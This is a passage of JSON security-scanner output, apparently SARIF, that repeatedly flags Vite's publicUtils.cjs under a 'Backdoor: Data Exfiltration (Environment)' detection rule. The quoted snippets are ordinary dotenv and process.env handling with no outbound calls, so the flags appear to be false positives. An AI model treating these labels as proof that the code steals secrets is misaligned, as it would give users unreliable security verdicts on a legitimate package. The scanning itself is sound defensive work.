            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6133,
                  "startColumn": 17,
                  "endLine": 6133,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n  }\n  return env;\n",
                    "rendered": {
                      "text": "  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n  }\n  return env;\n",
                      "markdown": "`  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n  }\n  return env;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6131,
                  "startColumn": 20,
                  "endLine": 6131,
                  "endColumn": 31,
                  "snippet": {
                    "text": "      env[key] = value;\n    }\n  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n",
                    "rendered": {
                      "text": "      env[key] = value;\n    }\n  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n",
                      "markdown": "`      env[key] = value;\n    }\n  }\n  for (const key in process.env) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n      env[key] = process.env[key];\n    }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6124,
                  "startColumn": 26,
                  "endLine": 6124,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n  for (const [key, value] of Object.entries(parsed)) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n",
                    "rendered": {
                      "text": "  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n  for (const [key, value] of Object.entries(parsed)) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n",
                      "markdown": "`  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n  for (const [key, value] of Object.entries(parsed)) {\n    if (prefixes.some((prefix) => key.startsWith(prefix))) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6122,
                  "startColumn": 4,
                  "endLine": 6122,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n",
                    "rendered": {
                      "text": "    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n",
                      "markdown": "`    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n  expand_1({ parsed, processEnv });\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6121,
                  "startColumn": 29,
                  "endLine": 6121,
                  "endColumn": 40,
                  "snippet": {
                    "text": "  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n",
                    "rendered": {
                      "text": "  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n",
                      "markdown": "`  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n  }\n  const processEnv = { ...process.env };\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6119,
                  "startColumn": 4,
                  "endLine": 6119,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n",
                    "rendered": {
                      "text": "    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n",
                      "markdown": "`    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n    process.env.BROWSER_ARGS = parsed.BROWSER_ARGS;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6118,
                  "startColumn": 24,
                  "endLine": 6118,
                  "endColumn": 35,
                  "snippet": {
                    "text": "  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n",
                    "rendered": {
                      "text": "  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n",
                      "markdown": "`  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6116,
                  "startColumn": 4,
                  "endLine": 6116,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n",
                    "rendered": {
                      "text": "    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n",
                      "markdown": "`    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6115,
                  "startColumn": 25,
                  "endLine": 6115,
                  "endColumn": 36,
                  "snippet": {
                    "text": "      return Object.entries(parse_1(fs$1.readFileSync(filePath)));\n    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n",
                    "rendered": {
                      "text": "      return Object.entries(parse_1(fs$1.readFileSync(filePath)));\n    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n",
                      "markdown": "`      return Object.entries(parse_1(fs$1.readFileSync(filePath)));\n    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6054,
                  "startColumn": 19,
                  "endLine": 6054,
                  "endColumn": 30,
                  "snippet": {
                    "text": "}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n",
                    "rendered": {
                      "text": "}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n",
                      "markdown": "`}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5961,
                  "startColumn": 9,
                  "endLine": 5961,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    throw err\n  }\n\n  // Set process.env\n  for (const key of Object.keys(parsed)) {\n    if (Object.prototype.hasOwnProperty.call(processEnv, key)) {\n      if (override === true) {\n",
                    "rendered": {
                      "text": "    throw err\n  }\n\n  // Set process.env\n  for (const key of Object.keys(parsed)) {\n    if (Object.prototype.hasOwnProperty.call(processEnv, key)) {\n      if (override === true) {\n",
                      "markdown": "`    throw err\n  }\n\n  // Set process.env\n  for (const key of Object.keys(parsed)) {\n    if (Object.prototype.hasOwnProperty.call(processEnv, key)) {\n      if (override === true) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5950,
                  "startColumn": 12,
                  "endLine": 5950,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  }\n}\n\n// Populate process.env with parsed values\nfunction populate (processEnv, parsed, options = {}) {\n  const debug = Boolean(options && options.debug);\n  const override = Boolean(options && options.override);\n",
                    "rendered": {
                      "text": "  }\n}\n\n// Populate process.env with parsed values\nfunction populate (processEnv, parsed, options = {}) {\n  const debug = Boolean(options && options.debug);\n  const override = Boolean(options && options.override);\n",
                      "markdown": "`  }\n}\n\n// Populate process.env with parsed values\nfunction populate (processEnv, parsed, options = {}) {\n  const debug = Boolean(options && options.debug);\n  const override = Boolean(options && options.override);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5900,
                  "startColumn": 13,
                  "endLine": 5900,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  }\n}\n\n// Populates process.env from .env file\nfunction config (options) {\n  // fallback to original dotenv if DOTENV_KEY is not set\n  if (_dotenvKey(options).length === 0) {\n",
                    "rendered": {
                      "text": "  }\n}\n\n// Populates process.env from .env file\nfunction config (options) {\n  // fallback to original dotenv if DOTENV_KEY is not set\n  if (_dotenvKey(options).length === 0) {\n",
                      "markdown": "`  }\n}\n\n// Populates process.env from .env file\nfunction config (options) {\n  // fallback to original dotenv if DOTENV_KEY is not set\n  if (_dotenvKey(options).length === 0) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5886,
                  "startColumn": 19,
                  "endLine": 5886,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    }\n  }\n\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n",
                    "rendered": {
                      "text": "    }\n  }\n\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n",
                      "markdown": "`    }\n  }\n\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5869,
                  "startColumn": 42,
                  "endLine": 5869,
                  "endColumn": 53,
                  "snippet": {
                    "text": "  }\n\n  // Build the parsed data in a temporary object (because we need to return it).  Once we have the final\n  // parsed data, we will combine it with process.env (or options.processEnv if provided).\n  let lastError;\n  const parsedAll = {};\n  for (const path of optionPaths) {\n",
                    "rendered": {
                      "text": "  }\n\n  // Build the parsed data in a temporary object (because we need to return it).  Once we have the final\n  // parsed data, we will combine it with process.env (or options.processEnv if provided).\n  let lastError;\n  const parsedAll = {};\n  for (const path of optionPaths) {\n",
                      "markdown": "`  }\n\n  // Build the parsed data in a temporary object (because we need to return it).  Once we have the final\n  // parsed data, we will combine it with process.env (or options.processEnv if provided).\n  let lastError;\n  const parsedAll = {};\n  for (const path of optionPaths) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5833,
                  "startColumn": 19,
                  "endLine": 5833,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n  const parsed = DotenvModule._parseVault(options);\n\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n",
                    "rendered": {
                      "text": "\n  const parsed = DotenvModule._parseVault(options);\n\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n",
                      "markdown": "`\n  const parsed = DotenvModule._parseVault(options);\n\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5750,
                  "startColumn": 11,
                  "endLine": 5750,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n  // fallback to empty string\n",
                    "rendered": {
                      "text": "\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n  // fallback to empty string\n",
                      "markdown": "`\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n  // fallback to empty string\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5749,
                  "startColumn": 32,
                  "endLine": 5749,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  }\n\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n",
                    "rendered": {
                      "text": "  }\n\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n",
                      "markdown": "`  }\n\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5749,
                  "startColumn": 6,
                  "endLine": 5749,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  }\n\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n",
                    "rendered": {
                      "text": "  }\n\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n",
                      "markdown": "`  }\n\n  // secondary infra already contains a DOTENV_KEY environment variable\n  if (process.env.DOTENV_KEY && process.env.DOTENV_KEY.length > 0) {\n    return process.env.DOTENV_KEY\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5421,
                  "startColumn": 70,
                  "endLine": 5421,
                  "endColumn": 81,
                  "snippet": {
                    "text": "  const loggedErrors = /* @__PURE__ */ new WeakSet();\n  const { prefix = \"[vite]\", allowClearScreen = true } = options;\n  const thresh = LogLevels[level];\n  const canClearScreen = allowClearScreen && process.stdout.isTTY && !process.env.CI;\n  const clear = canClearScreen ? clearScreen : () => {\n  };\n  function format(type, msg, options2 = {}) {\n",
                    "rendered": {
                      "text": "  const loggedErrors = /* @__PURE__ */ new WeakSet();\n  const { prefix = \"[vite]\", allowClearScreen = true } = options;\n  const thresh = LogLevels[level];\n  const canClearScreen = allowClearScreen && process.stdout.isTTY && !process.env.CI;\n  const clear = canClearScreen ? clearScreen : () => {\n  };\n  function format(type, msg, options2 = {}) {\n",
                      "markdown": "`  const loggedErrors = /* @__PURE__ */ new WeakSet();\n  const { prefix = \"[vite]\", allowClearScreen = true } = options;\n  const thresh = LogLevels[level];\n  const canClearScreen = allowClearScreen && process.stdout.isTTY && !process.env.CI;\n  const clear = canClearScreen ? clearScreen : () => {\n  };\n  function format(type, msg, options2 = {}) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3399,
                  "startColumn": 14,
                  "endLine": 3399,
                  "endColumn": 25,
                  "snippet": {
                    "text": "}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$2(namespace);\n  const { onlyWhenFocused } = options;\n",
                    "rendered": {
                      "text": "}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$2(namespace);\n  const { onlyWhenFocused } = options;\n",
                      "markdown": "`}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$2(namespace);\n  const { onlyWhenFocused } = options;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3398,
                  "startColumn": 15,
                  "endLine": 3398,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  return JSON.parse(fs$1.readFileSync(pkgPath, \"utf-8\")).version;\n}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$2(namespace);\n",
                    "rendered": {
                      "text": "  return JSON.parse(fs$1.readFileSync(pkgPath, \"utf-8\")).version;\n}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$2(namespace);\n",
                      "markdown": "`  return JSON.parse(fs$1.readFileSync(pkgPath, \"utf-8\")).version;\n}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$2(namespace);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
